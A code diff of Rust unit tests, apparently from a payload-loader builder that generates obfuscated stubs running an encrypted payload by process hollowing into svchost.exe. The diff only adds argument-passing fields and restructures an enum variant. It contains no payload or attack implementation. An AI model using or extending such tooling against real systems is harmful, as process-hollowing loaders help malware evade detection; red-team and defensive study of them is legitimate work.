@@ -450,12 +450,14 @@ mod tests {
             stub_marker: crate::engine::stub::generate_stub_marker(),
             payload_path: "payload.bin".to_string(),
             build_args: std::collections::BTreeMap::new(),
+            payload_args: Vec::new(),
+            args_mode: crate::engine::args::ArgsMode::Join,
         };
-        let pipeline = vec![crate::techniques::RuntimeStep::ProcessHollowing(
-            crate::techniques::process_hollowing::Params {
+        let pipeline = vec![crate::techniques::RuntimeStep::ProcessHollowing {
+            params: crate::techniques::process_hollowing::Params {
                 target: r"C:\Windows\System32\svchost.exe".to_string(),
             },
-        )];
+        }];
         let strings = crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap();
         let syscalls = crate::engine::syscalls::SyscallsConfig::default();
         let stub_src =
@@ -536,12 +538,14 @@ mod tests {
                 stub_marker: marker.clone(),
                 payload_path: "payload.bin".to_string(),
                 build_args: std::collections::BTreeMap::new(),
+                payload_args: Vec::new(),
+                args_mode: crate::engine::args::ArgsMode::Join,
             };
-            let pipeline = vec![crate::techniques::RuntimeStep::ProcessHollowing(
-                crate::techniques::process_hollowing::Params {
+            let pipeline = vec![crate::techniques::RuntimeStep::ProcessHollowing {
+                params: crate::techniques::process_hollowing::Params {
                     target: target.clone(),
                 },
-            )];
+            }];
             let stub_src = crate::engine::stub::render_main_rs(
                 &template,
                 &params,
@@ -625,6 +629,8 @@ mod tests {
                 stub_marker: crate::engine::stub::generate_stub_marker(),
                 payload_path: "payload.bin".to_string(),
                 build_args: std::collections::BTreeMap::new(),
+                payload_args: Vec::new(),
+                args_mode: crate::engine::args::ArgsMode::Join,
             };
             let stub_src = crate::engine::stub::render_main_rs(
                 &template,
@@ -687,6 +693,8 @@ mod tests {
             stub_marker: crate::engine::stub::generate_stub_marker(),
             payload_path: "payload.bin".to_string(),
             build_args: std::collections::BTreeMap::new(),
+            payload_args: Vec::new(),
+            args_mode: crate::engine::args::ArgsMode::Join,
         };
         let strings = crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap();
         let rendered = crate::engine::stub::render_custom_stub(
@@ -738,11 +746,11 @@ mod tests {
                 .join("main.rs.tpl"),
         )
         .unwrap();
-        let pipeline = vec![crate::techniques::RuntimeStep::ProcessHollowing(
-            crate::techniques::process_hollowing::Params {
+        let pipeline = vec![crate::techniques::RuntimeStep::ProcessHollowing {
+            params: crate::techniques::process_hollowing::Params {
                 target: r"C:\Windows\System32\svchost.exe".to_string(),
             },
-        )];
+        }];
         let params = crate::engine::stub::StubParams {
             nonce: encrypted.nonce,
             key: encrypted.key,
@@ -751,6 +759,8 @@ mod tests {
             stub_marker: crate::engine::stub::generate_stub_marker(),
             payload_path: "payload.bin".to_string(),
             build_args: std::collections::BTreeMap::new(),
+            payload_args: Vec::new(),
+            args_mode: crate::engine::args::ArgsMode::Join,
         };
         let strings = crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap();
         let stub_src =
